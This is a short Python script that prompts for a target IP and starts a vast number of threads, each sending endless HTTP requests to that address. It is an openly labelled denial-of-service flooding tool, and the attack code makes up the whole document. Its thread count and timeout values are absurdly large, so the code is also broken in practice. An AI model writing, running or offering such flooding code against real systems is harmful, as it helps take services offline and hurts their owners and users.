import requests
import threading

# Get user input for the target IP
target_ip = input("Enter Target IP: ")
target_url = f"http://{target_ip}"  # Change to https:// if needed

# Number of threads (simultaneous requests)
num_threads = 100000000000000  # Adjust as needed

# Function to send requests
def attack():
    while True:
        try:
            response = requests.get(target_url, timeout=100000000000000)
            print(f"Sent request to {target_url} | Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Start attack threads
for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
